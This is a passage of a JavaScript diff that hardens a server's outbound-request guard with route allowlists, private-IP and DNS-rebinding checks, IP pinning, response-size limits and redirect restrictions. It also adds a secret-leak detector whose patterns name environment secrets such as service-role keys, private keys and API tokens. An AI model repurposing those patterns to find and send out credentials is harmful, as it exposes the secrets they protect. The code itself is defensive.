+  const classification = String(ctx && ctx.classification || '').trim().toLowerCase();
+  const knownAction = Boolean(action && (DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.has(action) || DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(action)));
+  if (!knownAction) return { ok: false, reason: 'egress_action_context_not_allowlisted' };
+  const actionAllowed = (patterns) => patterns.some((pattern) => pattern instanceof RegExp ? pattern.test(action) : String(pattern) === action);
+  const noQuery = () => Array.from(url.searchParams.keys()).length === 0;
+  const exact = (expectedHost, expectedPath, methods, actions, policy) => {
+    if (host !== expectedHost || path !== expectedPath || !methods.includes(verb) || !noQuery() || !actionAllowed(actions)) return null;
+    return { ok: true, policy, action };
+  };
+  const configuredExact = (envName, defaultBase, suffix, methods, actions, policy, allowedQueryKeys) => {
+    try {
+      const base = new URL(String(process.env[envName] || defaultBase).replace(/\/+$/, '') + '/');
+      const expectedPath = (base.pathname.replace(/\/+$/, '') + suffix).replace(/\/{2,}/g, '/');
+      if (url.origin !== base.origin || path !== expectedPath || !methods.includes(verb) || !actionAllowed(actions)) return null;
+      const actualKeys = Array.from(url.searchParams.keys()).sort();
+      const expectedKeys = Array.from(allowedQueryKeys || []).sort();
+      if (actualKeys.length !== expectedKeys.length || actualKeys.some((key, index) => key !== expectedKeys[index])) return null;
+      return { ok: true, policy, action };
+    } catch (errorV228) {
+      diracCentralRecordSuppressedExceptionV221(errorV228);
+      return null;
+    }
+  };
+
+  const emailActions = [/^domain_register$/, /^domain_checkout$/, /^create_payment$/, /^midtrans_webhook$/, /^customer_security_/, /^admin_/, /^domain_login$/];
+  const resend = exact('api.resend.com', '/emails', ['POST'], emailActions, 'resend_email');
+  if (resend) return resend;
+  const brevo = exact('api.brevo.com', '/v3/smtp/email', ['POST'], emailActions, 'brevo_email');
+  if (brevo) return brevo;
+  const midtrans = exact('app.midtrans.com', '/snap/v1/transactions', ['POST'], ['domain_checkout', 'create_payment'], 'midtrans_snap')
+    || exact('app.sandbox.midtrans.com', '/snap/v1/transactions', ['POST'], ['domain_checkout', 'create_payment'], 'midtrans_snap');
+  if (midtrans) return midtrans;
+  const firebase = exact('www.googleapis.com', '/robot/v1/metadata/x509/securetoken@system.gserviceaccount.com', ['GET'], [/^admin_/, /^customer_security_/, 'domain_dashboard_me'], 'firebase_certificates');
+  if (firebase && (classification === 'admin' || actionAllowed([/^admin_/, /^customer_security_/, 'domain_dashboard_me']))) return firebase;
+
+  const domainProviderActions = ['hostinger_check', 'domain_check', 'domain_checkout'];
+  const namecomRoute = configuredExact('NAMECOM_API_BASE', 'https://api.name.com', '/core/v1/domains:checkAvailability', ['POST'], domainProviderActions, 'namecom_availability', []);
+  if (namecomRoute) return namecomRoute;
+  const namesiloRoute = configuredExact('NAMESILO_API_BASE', 'https://www.namesilo.com/api', '/checkRegisterAvailability', ['GET'], domainProviderActions, 'namesilo_availability', ['domains', 'key', 'type', 'version']);
+  if (namesiloRoute) return namesiloRoute;
+  const whoisJsonRoute = configuredExact('WHOISJSON_API_BASE', 'https://whoisjson.com/api/v1', '/domain-availability', ['GET'], domainProviderActions, 'whoisjson_availability', ['domain']);
+  if (whoisJsonRoute) return whoisJsonRoute;
+  const hostingerAvailability = configuredExact('HOSTINGER_API_BASE', HOSTINGER_API_BASE, '/api/domains/v1/availability', ['POST'], domainProviderActions, 'hostinger_availability', []);
+  if (hostingerAvailability) return hostingerAvailability;
+  const hostingerCatalog = configuredExact('HOSTINGER_API_BASE', HOSTINGER_API_BASE, '/api/billing/v1/catalog', ['GET'], domainProviderActions, 'hostinger_catalog', []);
+  if (hostingerCatalog) return hostingerCatalog;
+
+  const supabaseHosts = diracCentralConfiguredSupabaseHostsV194();
+  if (supabaseHosts.has(host)) {
+    if (!diracCentralDatabaseEgressPermitMatchesV230(url, verb, ctx, options)) return { ok: false, reason: 'supabase_exact_database_permit_required' };
+    return { ok: true, policy: 'supabase_exact_database_permit_v230', action };
+  }
+
+  const recoveryUrl = String(process.env.DIRAC_RECOVERY_WORKER_URL || '').trim();
+  if (recoveryUrl && actionAllowed([/recovery/, /passkey/, /^customer_security_/])) {
+    try {
+      const configured = new URL(recoveryUrl);
+      if (host === configured.hostname.toLowerCase()
+          && path === configured.pathname.replace(/\/+$/, '')
+          && verb === 'POST'
+          && url.searchParams.get('action') === DIRAC_RECOVERY_WORKER_ACTION
+          && Array.from(url.searchParams.keys()).length === 1) {
+        return { ok: true, policy: 'recovery_worker_exact', action };
+      }
+    } catch (errorV228) {
+      diracCentralRecordSuppressedExceptionV221(errorV228);
+    }
+  }
+
+  const securityWebhook = String(process.env.DIRAC_LOGIN_SECURITY_WEBHOOK_URL || '').trim();
+  if (securityWebhook) {
+    try {
+      const configured = new URL(securityWebhook);
+      if (url.origin === configured.origin && path === configured.pathname && url.search === configured.search && verb === 'POST') {
+        return { ok: true, policy: 'security_webhook_exact', action };
+      }
+    } catch (errorV228) {
+      diracCentralRecordSuppressedExceptionV221(errorV228);
+    }
+  }
+  return { ok: false, reason: 'egress_route_or_action_not_allowlisted' };
+}
+
 async function diracCentralInspectEgressV146(input, options = {}) {
   let url;
-  try { url = new URL(typeof input === 'string' ? input : input && input.url || ''); } catch (_) { return { ok: true }; }
+  try { url = new URL(typeof input === 'string' ? input : input && input.url || ''); } catch (_) { return { block: true, reason: 'egress_url_invalid' }; }
+  if (String(url.href || '').length > 4096) return { block: true, reason: 'egress_url_too_long' };
   if (!/^https:$/.test(url.protocol)) return { block: true, reason: 'egress_protocol_blocked' };
-  const host = url.hostname.toLowerCase();
+  if (url.username || url.password) return { block: true, reason: 'egress_url_credentials_blocked' };
+  if (url.port && url.port !== '443') return { block: true, reason: 'egress_nonstandard_port_blocked' };
+  const method = String(options && options.method || 'GET').toUpperCase();
+  if (!['GET', 'HEAD', 'POST', 'PUT', 'PATCH', 'DELETE'].includes(method)) return { block: true, reason: 'egress_method_blocked' };
+  const host = String(url.hostname || '').toLowerCase().replace(/\.$/, '');
+  if (!host || host !== String(url.hostname || '').toLowerCase()) return { block: true, reason: 'egress_host_canonicalization_invalid' };
   if (diracCentralIsUnsafeHostV146(host)) return { block: true, reason: 'egress_private_or_metadata_host' };
   if (!diracCentralAllowedEgressHostV146(host)) return { block: true, reason: 'egress_host_not_allowlisted' };
+  const route = diracCentralEgressRouteAllowedV228(url, method, diracCentralCurrentContextV149(), options);
+  if (!route.ok) return { block: true, reason: route.reason || 'egress_route_not_allowlisted' };
+  if (url.hash) return { block: true, reason: 'egress_fragment_rejected' };
   const directService = diracCentralDirectServiceRoleFetchV146(url, input, options);
   if (directService.block) return directService;
-  const dns = await diracCentralResolveHostIpsV146(host).catch(() => []);
+  const secretLeak = await diracCentralOutboundSecretLeakGuardV194(url, input, options);
+  if (secretLeak.block) return secretLeak;
+  let dns;
+  try { dns = await diracCentralResolveHostIpsV146(host); }
+  catch (_) { return { block: true, reason: 'egress_dns_resolution_failed' }; }
+  if (!Array.isArray(dns) || dns.length < 1) return { block: true, reason: 'egress_dns_resolution_empty' };
   if (dns.some(diracCentralIsUnsafeIpV146)) return { block: true, reason: 'egress_dns_resolved_private_ip' };
-  return { ok: true };
+  return { ok: true, host, ips: dns.slice(), route: route.policy };
+}
+
+function diracCentralEgressResponseMaxBytesV228(host) {
+  const configured = Number(process.env.DIRAC_EGRESS_RESPONSE_MAX_BYTES || 8 * 1024 * 1024);
+  const base = Number.isFinite(configured) ? Math.max(64 * 1024, Math.min(32 * 1024 * 1024, configured)) : 8 * 1024 * 1024;
+  if (host === 'www.googleapis.com') return Math.min(base, 1024 * 1024);
+  if (host === 'api.resend.com' || host === 'api.brevo.com') return Math.min(base, 2 * 1024 * 1024);
+  return base;
+}
+
+function diracCentralGuardEgressResponseV228(response, host) {
+  if (!response || !response.headers || typeof response.headers.get !== 'function' || response.__diracEgressResponseGuardV228) return response;
+  const max = diracCentralEgressResponseMaxBytesV228(host);
+  const declared = Number(response.headers.get('content-length') || 0);
+  if (Number.isFinite(declared) && declared > max) {
+    try { if (response.body && typeof response.body.cancel === 'function') response.body.cancel(); } catch (errorV228) { diracCentralRecordSuppressedExceptionV221(errorV228); }
+    const error = new Error('DIRAC_EGRESS_RESPONSE_TOO_LARGE');
+    error.code = 'DIRAC_EGRESS_RESPONSE_TOO_LARGE';
+    throw error;
+  }
+  const wrap = (name, measure) => {
+    if (typeof response[name] !== 'function') return;
+    const original = response[name].bind(response);
+    response[name] = async function diracCentralBoundedEgressResponseV228() {
+      const value = await original();
+      const bytes = measure(value);
+      if (bytes > max) {
+        const error = new Error('DIRAC_EGRESS_RESPONSE_TOO_LARGE');
+        error.code = 'DIRAC_EGRESS_RESPONSE_TOO_LARGE';
+        throw error;
+      }
+      return value;
+    };
+  };
+  wrap('text', (value) => Buffer.byteLength(String(value || ''), 'utf8'));
+  wrap('arrayBuffer', (value) => value && Number(value.byteLength || 0));
+  wrap('blob', (value) => value && Number(value.size || 0));
+  wrap('json', (value) => {
+    try { return Buffer.byteLength(JSON.stringify(value), 'utf8'); } catch (_) { return max + 1; }
+  });
+  Object.defineProperty(response, '__diracEgressResponseGuardV228', { value: true, enumerable: false });
+  return response;
+}
+
+const DIRAC_CENTRAL_NATIVE_HTTP_REQUEST_V230 = require('http').request;
+const DIRAC_CENTRAL_NATIVE_HTTPS_REQUEST_V230 = require('https').request;
+const DIRAC_CENTRAL_NATIVE_NET_SOCKET_V230 = require('net').Socket;
+const DIRAC_CENTRAL_NATIVE_NET_SOCKET_CONNECT_V230 = DIRAC_CENTRAL_NATIVE_NET_SOCKET_V230.prototype.connect;
+const DIRAC_CENTRAL_NATIVE_NET_CONNECT_V230 = function diracCentralNativeNetConnectV230(options) {
+  const socket = new DIRAC_CENTRAL_NATIVE_NET_SOCKET_V230();
+  return DIRAC_CENTRAL_NATIVE_NET_SOCKET_CONNECT_V230.call(socket, options);
+};
+const DIRAC_CENTRAL_NATIVE_TLS_CONNECT_V230 = require('tls').connect;
+const DIRAC_CENTRAL_NATIVE_DNS_PROMISES_V230 = require('dns').promises;
+const DIRAC_CENTRAL_NATIVE_DNS_RESOLVE4_V230 = DIRAC_CENTRAL_NATIVE_DNS_PROMISES_V230.resolve4.bind(DIRAC_CENTRAL_NATIVE_DNS_PROMISES_V230);
+const DIRAC_CENTRAL_NATIVE_DNS_RESOLVE6_V230 = DIRAC_CENTRAL_NATIVE_DNS_PROMISES_V230.resolve6.bind(DIRAC_CENTRAL_NATIVE_DNS_PROMISES_V230);
+const DIRAC_CENTRAL_NATIVE_DNS_RESOLVE_CNAME_V230 = DIRAC_CENTRAL_NATIVE_DNS_PROMISES_V230.resolveCname.bind(DIRAC_CENTRAL_NATIVE_DNS_PROMISES_V230);
+const DIRAC_CENTRAL_NATIVE_DNS_LOOKUP_V230 = DIRAC_CENTRAL_NATIVE_DNS_PROMISES_V230.lookup.bind(DIRAC_CENTRAL_NATIVE_DNS_PROMISES_V230);
+
+function diracCentralBoundedReadableStreamV230(incoming, request, maximumBytes) {
+  const { Transform } = require('stream');
+  const maximum = Math.max(1, Number(maximumBytes || 0));
+  let total = 0;
+  const limiter = new Transform({
+    transform(chunk, _encoding, callback) {
+      total += Buffer.byteLength(chunk);
+      if (total > maximum) {
+        const error = Object.assign(new Error('DIRAC_EGRESS_RESPONSE_TOO_LARGE'), { code: 'DIRAC_EGRESS_RESPONSE_TOO_LARGE' });
+        try { incoming.destroy(error); } catch (errorV230) { diracCentralRecordSuppressedExceptionV221(errorV230); }
+        try { request.destroy(error); } catch (errorV230) { diracCentralRecordSuppressedExceptionV221(errorV230); }
+        callback(error);
+        return;
+      }
+      callback(null, chunk);
+    }
+  });
+  incoming.on('error', (error) => limiter.destroy(error));
+  incoming.pipe(limiter);
+  return limiter;
+}
+
+async function diracCentralPinnedHttpsFetchV230(
+  parsedUrl,
+  options,
+  verifiedIps,
+  maximumBytes,
+  streamTimeoutOverrideMs
+) {
+  const net = require('net');
+  const { Readable } = require('stream');
+  const ips = Array.from(new Set((verifiedIps || []).map(String))).filter((ip) => net.isIP(ip) && !diracCentralIsUnsafeIpV146(ip));
+  if (!ips.length) throw Object.assign(new Error('DIRAC_PINNED_DNS_IP_REQUIRED'), { code: 'DIRAC_PINNED_DNS_IP_REQUIRED' });
+  const pinnedIp = ips.sort()[0];
+  const method = String(options && options.method || 'GET').toUpperCase();
+  const headers = diracCentralHeaderObjectV230(options && options.headers);
+  const body = diracCentralBodyBytesV230(options && options.body);
+  if (body.length && headers['content-length'] === undefined) headers['content-length'] = String(body.length);
+  const signal = options && options.signal;
+  const streamTimeoutMs =
+    Number.isSafeInteger(streamTimeoutOverrideMs) &&
+    streamTimeoutOverrideMs >= 3000 &&
+    streamTimeoutOverrideMs <= 290000
+      ? streamTimeoutOverrideMs
+      : Math.max(
+          1000,
+          Math.min(
+            120000,
+            Number(process.env.DIRAC_EGRESS_STREAM_TIMEOUT_MS || 30000)
+          )
+        );
+
+  return await new Promise((resolve, reject) => {
+    let settled = false;
+    const request = DIRAC_CENTRAL_NATIVE_HTTPS_REQUEST_V230({
+      protocol: 'https:', hostname: parsedUrl.hostname, port: Number(parsedUrl.port || 443),
+      servername: parsedUrl.hostname, method, path: parsedUrl.pathname + parsedUrl.search,
+      headers, agent: false, rejectUnauthorized: true, minVersion: 'TLSv1.2',
+      lookup(_hostname, lookupOptions, callback) {
+        const pinnedFamily = net.isIP(pinnedIp);
+        if (lookupOptions && lookupOptions.all === true) {
+          callback(null, [{ address: pinnedIp, family: pinnedFamily }]);
+          return;
+        }
+        callback(null, pinnedIp, pinnedFamily);
+      }
+    }, (incoming) => {
+      const limiter = diracCentralBoundedReadableStreamV230(incoming, request, maximumBytes);
+      incoming.setTimeout(streamTimeoutMs, () => {
+        const error = Object.assign(new Error('DIRAC_EGRESS_STREAM_TIMEOUT'), { code: 'DIRAC_EGRESS_STREAM_TIMEOUT' });
+        incoming.destroy(error);
+        request.destroy(error);
+      });
+      const responseHeaders = new Headers();
+      for (const [name, value] of Object.entries(incoming.headers || {})) {
+        if (Array.isArray(value)) value.forEach((item) => responseHeaders.append(name, String(item)));
+        else if (value !== undefined) responseHeaders.set(name, String(value));
+      }
+      const noBody = method === 'HEAD' || [204, 205, 304].includes(Number(incoming.statusCode || 0));
+      const webBody = noBody ? null : Readable.toWeb(limiter);
+      settled = true;
+      resolve(new Response(webBody, { status: Number(incoming.statusCode || 502), statusText: String(incoming.statusMessage || ''), headers: responseHeaders }));
+    });
+    request.setTimeout(streamTimeoutMs, () => request.destroy(Object.assign(new Error('DIRAC_EGRESS_STREAM_TIMEOUT'), { code: 'DIRAC_EGRESS_STREAM_TIMEOUT' })));
+    request.on('error', (error) => { if (!settled) reject(error); });
+    if (signal) {
+      if (signal.aborted) request.destroy(signal.reason instanceof Error ? signal.reason : new Error('AbortError'));
+      else signal.addEventListener('abort', () => request.destroy(signal.reason instanceof Error ? signal.reason : Object.assign(new Error('AbortError'), { name: 'AbortError' })), { once: true });
+    }
+    if (body.length) request.write(body);
+    request.end();
+  });
+}
+
+async function diracCentralOpenSmtpSocketV230(host, port, secure, timeoutMs) {
+  const tls = require('tls');
+  const net = require('net');
+  const cleanHost = String(host || '').trim().toLowerCase();
+  const cleanPort = Number(port || 0);
+  const allowedPorts = new Set([465, 587]);
+  const configuredHosts = new Set(Object.keys(process.env).filter((name) => /(?:^|_)SMTP_HOST$/.test(name)).map((name) => String(process.env[name] || '').trim().toLowerCase()).filter(Boolean));
+  if (!cleanHost || !configuredHosts.has(cleanHost) || !allowedPorts.has(cleanPort) || diracCentralIsUnsafeHostV146(cleanHost)) {
+    throw Object.assign(new Error('DIRAC_SMTP_EGRESS_POLICY_REJECTED'), { code: 'DIRAC_SMTP_EGRESS_POLICY_REJECTED' });
+  }
+  const ips = await diracCentralResolveHostIpsV146(cleanHost);
+  const pinnedIp = ips.find((ip) => net.isIP(ip) && !diracCentralIsUnsafeIpV146(ip));
+  if (!pinnedIp) throw Object.assign(new Error('DIRAC_SMTP_PINNED_IP_REQUIRED'), { code: 'DIRAC_SMTP_PINNED_IP_REQUIRED' });
+  const socket = secure
+    ? DIRAC_CENTRAL_NATIVE_TLS_CONNECT_V230({ host: pinnedIp, port: cleanPort, servername: cleanHost, rejectUnauthorized: true, minVersion: 'TLSv1.2', timeout: timeoutMs })
+    : DIRAC_CENTRAL_NATIVE_NET_CONNECT_V230({ host: pinnedIp, port: cleanPort, timeout: timeoutMs });
+  Object.defineProperty(socket, '__diracSmtpPinnedHostV230', { value: cleanHost, enumerable: false, writable: false, configurable: false });
+  Object.defineProperty(socket, '__diracSmtpPinnedIpV230', { value: pinnedIp, enumerable: false, writable: false, configurable: false });
+  return socket;
+}
+
+function diracCentralUpgradeSmtpTlsV230(socket, host) {
+  const tls = require('tls');
+  const cleanHost = String(host || '').trim().toLowerCase();
+  if (!socket || !cleanHost || socket.__diracSmtpPinnedHostV230 !== cleanHost || !socket.__diracSmtpPinnedIpV230 || diracCentralIsUnsafeHostV146(cleanHost)) {
+    throw Object.assign(new Error('DIRAC_SMTP_TLS_UPGRADE_INVALID'), { code: 'DIRAC_SMTP_TLS_UPGRADE_INVALID' });
+  }
+  return DIRAC_CENTRAL_NATIVE_TLS_CONNECT_V230({ socket, servername: cleanHost, rejectUnauthorized: true, minVersion: 'TLSv1.2' });
 }
 
 async function diracCentralFetchWithRedirectGuardV146(fetchImpl, input, options, depth) {
@@ -27583,68 +37116,288 @@ async function diracCentralFetchWithRedirectGuardV146(fetchImpl, input, options,
     error.code = 'DIRAC_EGRESS_REDIRECT_LIMIT';
     throw error;
   }
-  const guardedOptions = Object.assign({}, options || {}, { redirect: 'manual' });
-  const response = await fetchImpl(input, guardedOptions);
+  const inspection = await diracCentralInspectEgressV146(input, options).catch(() => ({ block: true, reason: 'egress_guard_exception' }));
+  if (!inspection || inspection.block || inspection.ok !== true) {
+    const error = new Error('DIRAC_EGRESS_BLOCKED');
+    error.code = 'DIRAC_EGRESS_BLOCKED';
+    error.diracSecurityThreat = inspection || { reason: 'egress_guard_invalid_result' };
+    throw error;
+  }
+  let parsedUrl;
+  try { parsedUrl = new URL(typeof input === 'string' ? input : input && input.url || ''); }
+  catch (_) {
+    const error = new Error('DIRAC_EGRESS_URL_INVALID');
+    error.code = 'DIRAC_EGRESS_URL_INVALID';
+    throw error;
+  }
+  const firstIps = await diracCentralResolveHostIpsV146(parsedUrl.hostname);
+  const rebinding = await diracCentralDnsRebindingGuardV221(parsedUrl.hostname, firstIps);
+  if (!rebinding.ok) {
+    const error = new Error('DIRAC_EGRESS_DNS_REBINDING_BLOCKED');
+    error.code = 'DIRAC_EGRESS_DNS_REBINDING_BLOCKED';
+    error.diracSecurityThreat = rebinding;
+    throw error;
+  }
+  const exactTimeoutMs = diracCentralRecoveryGenerateEgressTimeoutMsV225(input, options);
+  const timeout = diracCentralTimeoutOptionsV221(Object.assign({}, options || {}, { redirect: 'manual' }), exactTimeoutMs);
+  let response;
+  try {
+    const firstIpSet = new Set((inspection.ips || []).map(String));
+    const pinnedIps = Array.from(new Set((rebinding.ips || []).map(String).filter((ip) => firstIpSet.has(ip))));
+    if (!pinnedIps.length) throw Object.assign(new Error('DIRAC_EGRESS_DNS_PIN_INTERSECTION_EMPTY'), { code: 'DIRAC_EGRESS_DNS_PIN_INTERSECTION_EMPTY' });
+    response = await diracCentralPinnedHttpsFetchV230(
+      parsedUrl,
+      timeout.options,
+      pinnedIps,
+      diracCentralEgressResponseMaxBytesV228(
+        parsedUrl.hostname.toLowerCase()
+      ),
+      exactTimeoutMs
+    );
+  } catch (error) {
+    if (timeout.options.signal && timeout.options.signal.aborted && (!error || error.name === 'AbortError')) {
+      const timeoutError = new Error('DIRAC_EGRESS_TIMEOUT');
+      timeoutError.code = 'DIRAC_EGRESS_TIMEOUT';
+      throw timeoutError;
+    }
+    throw error;
+  } finally {
+    timeout.cleanup();
+  }
+  response = diracCentralGuardEgressResponseV228(response, parsedUrl.hostname.toLowerCase());
   const status = Number(response && response.status || 0);
   if (status < 300 || status > 399 || !response || !response.headers || typeof response.headers.get !== 'function') return response;
   const location = response.headers.get('location');
   if (!location) return response;
-  const base = new URL(typeof input === 'string' ? input : input && input.url || '');
+  const base = parsedUrl;
   const nextUrl = new URL(location, base);
-  const decision = await diracCentralInspectEgressV146(nextUrl.toString()).catch(() => ({ ok: true }));
+  const requestMethod = String(options && options.method || 'GET').toUpperCase();
+  if (nextUrl.origin !== base.origin) {
+    const error = new Error('DIRAC_EGRESS_CROSS_ORIGIN_REDIRECT_BLOCKED');
+    error.code = 'DIRAC_EGRESS_CROSS_ORIGIN_REDIRECT_BLOCKED';
+    throw error;
+  }
+  if (requestMethod !== 'GET' && requestMethod !== 'HEAD') {
+    const error = new Error('DIRAC_EGRESS_MUTATING_REDIRECT_BLOCKED');
+    error.code = 'DIRAC_EGRESS_MUTATING_REDIRECT_BLOCKED';
+    throw error;
+  }
+  const decision = await diracCentralInspectEgressV146(nextUrl.toString(), options).catch(() => ({ block: true, reason: 'egress_redirect_guard_exception' }));
   if (decision && decision.block) {
     const error = new Error('DIRAC_EGRESS_REDIRECT_BLOCKED');
     error.code = 'DIRAC_EGRESS_REDIRECT_BLOCKED';
     error.diracSecurityThreat = decision;
     throw error;
   }
+  try { if (response.body && typeof response.body.cancel === 'function') await response.body.cancel(); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
   return diracCentralFetchWithRedirectGuardV146(fetchImpl, nextUrl.toString(), options, currentDepth + 1);
 }
 
 function diracCentralDirectServiceRoleFetchV146(url, input, options = {}) {
   try {
     const ctx = diracCentralCurrentContextV149();
-    if (!ctx || ctx.__diracCentralSafeServiceRoleFetchV146) return { ok: true };
+    if (!ctx) return { block: true, reason: 'egress_central_context_required' };
     const host = String(url && url.hostname || '').toLowerCase();
-    if (!/\.supabase\.co$/i.test(host)) return { ok: true };
-    const serviceKey = String(process.env.DOMAIN_SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_SERVICE_KEY || '').trim();
-    if (!serviceKey) return { ok: true };
     const headers = options && options.headers || input && input.headers || {};
     const raw = typeof headers.get === 'function'
       ? [headers.get('authorization'), headers.get('apikey')].join('|')
       : Object.values(headers || {}).join('|');
-    if (raw.includes(serviceKey)) return { block: true, reason: 'direct_service_role_fetch_blocked' };
-  } catch (_) {}
+    const serviceKeys = Object.keys(process.env)
+      .filter((name) => /(?:SUPABASE_SERVICE_ROLE_KEY|SUPABASE_SERVICE_KEY)$/.test(name))
+      .map((name) => String(process.env[name] || '').trim())
+      .filter((value) => value.length >= 16);
+    const sendsServiceKey = serviceKeys.some((value) => raw.includes(value));
+    if (!sendsServiceKey) return { ok: true };
+    if (ctx.__diracCentralSafeServiceRoleFetchV146 && diracCentralConfiguredSupabaseHostsV194().has(host)) return { ok: true };
+    return { block: true, reason: 'direct_service_role_fetch_blocked' };
+  } catch (_) {
+    return { block: true, reason: 'direct_service_role_guard_exception' };
+  }
+  return { ok: true };
+}
+
+function diracCentralConfiguredSupabaseHostsV194() {
+  const hosts = new Set();
+  Object.keys(process.env).filter((name) => /SUPABASE_URL$/.test(name)).forEach((name) => {
+    try {
+      const value = String(process.env[name] || '').trim();
+      if (value) hosts.add(new URL(value).hostname.toLowerCase());
+    } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  });
+  return hosts;
+}
+
+function diracCentralRuntimeSecretEntriesV194(includeVendorKeys) {
+  const entries = [];
+  for (const name of Object.keys(process.env)) {
+    if (/(?:VERSION|KEY_ID|DEBUG|ACTIONS|TABLES)$/i.test(name)) continue;
+    if (/(?:PUBLIC_KEY|PUBLIC_KEY_PEM|PUBLIC_KEY_DER_B64|ANON_KEY|PUBLISHABLE_KEY)$/i.test(name)) continue;
+    const internal = /(?:SECRET|PEPPER|PRIVATE_KEY|PRIVATE_KEY_PEM|PRIVATE_KEY_DER_B64|SERVICE_ROLE_KEY|SERVICE_KEY|APP_PASSWORD)$/i.test(name);
+    const vendor = includeVendorKeys && /(?:API_KEY|SERVER_KEY|ACCESS_TOKEN|REFRESH_TOKEN)$/i.test(name);
+    if (!internal && !vendor) continue;
+    const value = String(process.env[name] || '');
+    if (value.length >= 16) entries.push({ name, value });
+  }
+  return entries;
+}
+
+function diracCentralOutboundMaterialV194(url, input, options) {
+  const chunks = [String(url && url.toString ? url.toString() : url || '')];
+  try {
+    const headers = options && options.headers || input && input.headers || {};
+    if (headers && typeof headers.forEach === 'function') headers.forEach((value, key) => chunks.push(String(key), String(value)));
+    else Object.entries(headers || {}).forEach(([key, value]) => chunks.push(String(key), String(value)));
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  try {
+    const body = options && options.body;
+    if (typeof body === 'string') chunks.push(body);
+    else if (Buffer.isBuffer(body) || body instanceof Uint8Array) chunks.push(Buffer.from(body).toString('utf8'));
+    else if (body && typeof body.toString === 'function' && body.constructor && body.constructor.name === 'URLSearchParams') chunks.push(body.toString());
+    else if (body && typeof body === 'object' && Object.getPrototypeOf(body) === Object.prototype) chunks.push(JSON.stringify(body));
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  return chunks.join('\n');
+}
+
+async function diracCentralOutboundSecretLeakGuardV194(url, input, options) {
+  let material = diracCentralOutboundMaterialV194(url, input, options);
+  if ((!options || options.body === undefined) && input && input.body && typeof input.clone === 'function') {
+    try {
+      const cloned = input.clone();
+      const bytes = await Promise.race([
+        cloned.arrayBuffer(),
+        new Promise((resolve) => setTimeout(() => resolve(null), 1000))
+      ]);
+      if (!bytes) return { block: true, reason: 'egress_request_body_uninspectable' };
+      if (bytes.byteLength > 16 * 1024 * 1024) return { block: true, reason: 'egress_request_body_too_large' };
+      material += '\n' + Buffer.from(bytes).toString('utf8');
+    } catch (_) {
+      return { block: true, reason: 'egress_request_body_uninspectable' };
+    }
+  }
+  const ctx = diracCentralCurrentContextV149();
+  const host = String(url && url.hostname || '').toLowerCase();
+  for (const entry of diracCentralRuntimeSecretEntriesV194(false)) {
+    if (!material.includes(entry.value)) continue;
+    const serviceRole = /(?:SUPABASE_SERVICE_ROLE_KEY|SUPABASE_SERVICE_KEY)$/.test(entry.name);
+    if (serviceRole && ctx && ctx.__diracCentralSafeServiceRoleFetchV146 && diracCentralConfiguredSupabaseHostsV194().has(host)) continue;
+    return { block: true, reason: 'egress_runtime_secret_blocked' };
+  }
   return { ok: true };
 }
 
 async function diracCentralResolveHostIpsV146(host) {
-  const cleanHost = String(host || '').toLowerCase();
+  const cleanHost = String(host || '').trim().toLowerCase().replace(/\.$/, '');
+  if (!cleanHost || diracCentralIsUnsafeHostV146(cleanHost)) return [];
   const cached = DIRAC_CENTRAL_DNS_CACHE_V146.get(cleanHost);
   if (cached && Number(cached.until || 0) > Date.now()) return cached.ips || [];
-  try {
-    const dns = require('dns').promises;
-    const rows = await Promise.race([
-      dns.lookup(cleanHost, { all: true, verbatim: true }),
-      new Promise((resolve) => setTimeout(() => resolve([]), 1000))
+  const visited = new Set();
+  const ips = new Set();
+  const walk = async (name, depth) => {
+    const canonical = String(name || '').trim().toLowerCase().replace(/\.$/, '');
+    if (!canonical || depth > 8 || visited.has(canonical) || diracCentralIsUnsafeHostV146(canonical)) throw new Error('DIRAC_DNS_CHAIN_INVALID');
+    visited.add(canonical);
+    const [v4, v6, cnames] = await Promise.all([
+      DIRAC_CENTRAL_NATIVE_DNS_RESOLVE4_V230(canonical).catch(() => []),
+      DIRAC_CENTRAL_NATIVE_DNS_RESOLVE6_V230(canonical).catch(() => []),
+      DIRAC_CENTRAL_NATIVE_DNS_RESOLVE_CNAME_V230(canonical).catch(() => [])
     ]);
-    const ips = (rows || []).map((row) => String(row && row.address || '')).filter(Boolean).slice(0, 20);
-    DIRAC_CENTRAL_DNS_CACHE_V146.set(cleanHost, { until: Date.now() + 60 * 1000, ips });
+    for (const ip of [...v4, ...v6]) {
+      const clean = String(ip || '').trim();
+      if (!clean || diracCentralIsUnsafeIpV146(clean)) throw new Error('DIRAC_DNS_PRIVATE_OR_RESERVED_IP');
+      ips.add(clean);
+    }
+    for (const cname of cnames.slice(0, 8)) await walk(cname, depth + 1);
+    if (!v4.length && !v6.length && !cnames.length) {
+      const rows = await DIRAC_CENTRAL_NATIVE_DNS_LOOKUP_V230(canonical, { all: true, verbatim: true });
+      for (const row of rows || []) {
+        const clean = String(row && row.address || '').trim();
+        if (!clean || diracCentralIsUnsafeIpV146(clean)) throw new Error('DIRAC_DNS_PRIVATE_OR_RESERVED_IP');
+        ips.add(clean);
+      }
+    }
+  };
+  try {
+    await Promise.race([walk(cleanHost, 0), new Promise((_, reject) => setTimeout(() => reject(new Error('DIRAC_DNS_TIMEOUT')), 2500))]);
+    const result = Array.from(ips).slice(0, 32);
+    DIRAC_CENTRAL_DNS_CACHE_V146.set(cleanHost, { until: Date.now() + 30 * 1000, ips: result });
     diracCentralCleanupMapV146(DIRAC_CENTRAL_DNS_CACHE_V146, 2000, 1000);
-    return ips;
+    return result;
   } catch (_) {
-    DIRAC_CENTRAL_DNS_CACHE_V146.set(cleanHost, { until: Date.now() + 10 * 1000, ips: [] });
+    DIRAC_CENTRAL_DNS_CACHE_V146.set(cleanHost, { until: Date.now() + 5000, ips: [] });
     return [];
   }
 }
 
+function diracCentralIpv6BytesV228(ip) {
+  let text = String(ip || '').trim().toLowerCase().replace(/^\[|\]$/g, '').split('%')[0];
+  if (!text) return null;
+  if (text.includes('.')) {
+    const lastColon = text.lastIndexOf(':');
+    if (lastColon < 0) return null;
